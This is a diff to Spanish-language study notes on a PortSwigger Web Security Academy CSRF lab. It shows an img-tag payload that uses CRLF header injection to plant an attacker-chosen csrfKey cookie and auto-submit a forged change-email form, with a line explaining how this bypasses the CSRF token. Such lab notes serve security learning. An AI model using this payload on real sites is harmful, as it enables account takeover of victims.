@@ -50,6 +50,8 @@ Non-Session Cookie:
 
 <img src="https://0a74009804b0964280760dfe00b400b1.web-security-academy.net/?search=prueba%0d%0aSet-Cookie:%20csrfKey=8QPNWD5t9mVHdNdnRCJG5g6KtY8YLJpQ%3b%20SameSite=None" onerror="document.forms[0].submit();">
 ```
+- El ultimo bloque simplemente usa un CLRF (inyeccion de cabeceras HTTP), y con el /r/n url encodeados (%0d%0a) le inyecta al navegador de la victima nuestra csrfKey, lo cual, con el CSRF Token hidden que tiene la peticion anterior, hace que sean validos y se cambie el id de la victima.
+
 
 ```html
 <form class="login-form" name="change-email-form" action="https://0af7004c0302a40d8026807300e000d0.web-security-academy.net/my-account/change-email" method="POST">
